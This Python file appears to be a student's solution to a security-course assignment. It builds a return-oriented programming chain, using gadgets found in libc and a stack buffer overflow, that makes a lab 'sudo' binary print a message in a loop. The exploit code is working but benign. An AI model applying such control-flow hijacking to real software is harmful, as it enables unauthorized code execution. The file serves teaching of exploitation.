import os
import sys
import base64

import addresses
from infosec.core import assemble
from search import GadgetSearch
import struct

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP-chain for printing our
    message in an endless loop. Make sure to return a `bytes` object and not an
    `str` object.

    NOTES:
    1. Use `addresses.PUTS` to get the address of the `puts` function.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)

    #gadgets addresses.
    pop_esp_addr = search.find("pop esp")
    pop_ebp_addr = search.find("pop ebp")
    pop_eax_addr = search.find("pop eax")

    #addresses arithmetics
    puts_addr = addresses.PUTS
    prev_ra_addr = 0xbfffe02c
    loop_start_addr = prev_ra_addr + 8
    str_addr = prev_ra_addr + 28

    #writing the string itself
    string_content = get_string(206940777).encode('latin-1') + struct.pack("B", 0x0)
    
    code = struct.pack("<I", pop_ebp_addr) + 2*struct.pack("<I", puts_addr) + struct.pack("<I",pop_eax_addr)+ struct.pack("<I", str_addr)  + struct.pack("<I", pop_esp_addr) + struct.pack("<I", loop_start_addr) + string_content

    return bytes([0x64]*135) + code
    
    
    
    

def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
